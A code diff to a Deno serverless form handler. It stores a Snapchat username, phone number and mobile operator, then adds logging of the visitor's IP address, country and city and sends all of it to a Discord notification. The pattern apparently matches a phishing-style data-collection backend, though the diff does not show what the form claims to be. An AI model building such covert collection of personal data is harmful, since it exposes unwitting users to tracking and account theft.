@@ -11,18 +11,21 @@ Deno.serve(async (req) => {
 
 
 
-    // Get client IP
-    const ip = req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
-               req.headers.get('cf-connecting-ip') ||
-               req.headers.get('x-real-ip') ||
-               'unknown';
+    // Get client IP with geolocation
+    const ipData = await base44.functions.invoke('getClientIP', {});
+    const ip = ipData?.data?.ip || 'unknown';
+    const country = ipData?.data?.country || 'France';
+    const city = ipData?.data?.city || 'Inconnue';
 
     // Create submission
     const submission = await base44.asServiceRole.entities.Submission.create({
       snapchat,
       telephone,
       operateur,
-      status: 'pending'
+      status: 'pending',
+      ip_address: ip,
+      country: country,
+      browser: 'unknown'
     });
 
     // Send Discord notification
@@ -30,7 +33,10 @@ Deno.serve(async (req) => {
       snapchat,
       telephone,
       operateur,
-      submissionId: submission.id
+      submissionId: submission.id,
+      ip,
+      country,
+      city
     }).catch(() => {});
 
     return Response.json({ ok: true, submissionId: submission.id });
